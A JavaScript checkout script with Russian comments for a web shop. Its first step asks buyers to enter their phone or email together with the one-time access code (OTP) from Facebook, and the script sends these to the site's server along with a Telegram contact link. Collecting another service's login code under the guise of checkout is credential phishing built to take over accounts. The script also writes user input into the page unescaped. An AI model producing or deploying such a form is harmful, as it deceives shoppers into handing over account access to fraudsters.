document.addEventListener("DOMContentLoaded", () => {
    const checkoutButton = document.getElementById("checkout-button");
    const checkoutSteps = document.getElementById("checkout-steps");
    const checkoutInstructions = document.getElementById("checkout-instructions");
    const checkoutFields = document.getElementById("checkout-fields");
    const checkoutNext = document.getElementById("checkout-next");
    const checkoutSubmit = document.getElementById("checkout-submit");

    let step = 0; // Текущий шаг оформления заказа
    let orderData = {}; // Данные заказа

    // Обработчик для кнопки "Оформить заказ"
    checkoutButton.addEventListener("click", () => {
        step = 1;
        checkoutSteps.classList.remove("hidden");
        checkoutInstructions.textContent =
            "Пришлите телефон/электронную почту и одноразовый код доступа (OTP) от Facebook. Вы их можете найти в переписке в Telegram, если ранее делали заказ через человека. Если не делали или есть другие причины - напишите администратору.";
        checkoutFields.innerHTML = `
            <label>Телефон/Email:</label>
            <input type="text" id="contact-info" required>
            <label>OTP (одноразовый код):</label>
            <input type="text" id="otp-code" required>
        `;
        checkoutNext.classList.remove("hidden");
    });

    // Обработчик для кнопки "Далее"
    checkoutNext.addEventListener("click", () => {
        if (step === 1) {
            // Сохраняем данные шага 1
            orderData.contactInfo = document.getElementById("contact-info").value;
            orderData.otpCode = document.getElementById("otp-code").value;

            // Проверяем, что поля заполнены
            if (!orderData.contactInfo || !orderData.otpCode) {
                alert("Заполните все поля!");
                return;
            }

            // Переход к шагу 2
            step = 2;
            checkoutInstructions.textContent = "Введите ссылку для связи в Telegram:";
            checkoutFields.innerHTML = `
                <label>Ссылка для связи:</label>
                <input type="text" id="telegram-link" required>
            `;
        } else if (step === 2) {
            // Сохраняем данные шага 2
            orderData.telegramLink = document.getElementById("telegram-link").value;

            // Проверяем, что поле заполнено
            if (!orderData.telegramLink) {
                alert("Введите ссылку для связи!");
                return;
            }

            // Переход к шагу 3
            step = 3;
            checkoutInstructions.textContent = "Проверьте информацию о заказе:";
            checkoutFields.innerHTML = `
                <p>Контактная информация: ${orderData.contactInfo}</p>
                <p>OTP: ${orderData.otpCode}</p>
                <p>Ссылка для связи: ${orderData.telegramLink}</p>
                <ul>
                    ${generateCartHTML()} <!-- Подтягиваем товары из корзины -->
                </ul>
            `;
            checkoutNext.classList.add("hidden");
            checkoutSubmit.classList.remove("hidden");
        }
    });

    // Обработчик для кнопки "Оплатить"
    checkoutSubmit.addEventListener("click", () => {
        // Отправляем данные заказа на сервер
        fetch("/api/checkout", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(orderData),
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.success) {
                    alert("Заказ успешно оформлен!");
                    checkoutSteps.classList.add("hidden");
                } else {
                    alert("Ошибка оформления заказа: " + data.error);
                }
            })
            .catch((error) => {
                console.error("Ошибка:", error);
            });
    });

    // Генерация товаров из корзины
    function generateCartHTML() {
        // Здесь вы должны получить данные корзины из вашей базы или API
        // Пример:
        const cart = [
            { name: "Товар 1", quantity: 2, price: 500 },
            { name: "Товар 2", quantity: 1, price: 1000 },
        ];

        return cart
            .map(
                (item) =>
                    `<li>${item.name} x${item.quantity} - ${item.price * item.quantity} дублонов</li>`
            )
            .join("");
    }
});
